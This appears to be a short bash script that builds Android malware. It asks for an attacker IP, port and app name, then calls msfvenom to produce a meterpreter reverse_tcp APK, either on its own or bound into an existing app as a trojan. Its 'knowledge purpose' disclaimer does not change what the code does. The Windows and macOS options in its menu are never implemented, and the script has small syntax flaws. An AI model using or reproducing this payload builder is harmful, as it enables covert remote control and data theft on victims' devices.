printf "\n\n\t\t\twritten by: Animesh Sinha\n\n\t\t\tgithub: animesh-h\n\n\n"
echo -n "WARNING: THIS SCRIPT IS FOR KNOWLEDGE PURPOSE SO PLEASE DON'T USE IT ILLEGALY"
printf "\n\nEnter the type of os for which you want to create payload" 
printf "\n\n1.android\n2.windows\n3.mac os\n"
read n
case $n in
1)
echo -n "making payload for android devices: "
printf "\n1.apk only\n2.binded apk(signed)\n3.persistence apk\n"
read x
case $x in
1)
echo -n "enter your ip: "
read i_p
echo -n "enter port: "
read p
echo -n "enter name of apk: "
read nm
msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk
;;
2)
echo -n "enter your ip: "
read i_p
echo -n "enter port: "
read p
echo -n "enter name of apk: "
read nm
echo -n "attach original apk for binding: "
read f
msfvenom -p android/meterpreter/reverse_tcp lhost="$i_p" lport="$p" R> $nm.apk $f
;;
esac;;
esac
done
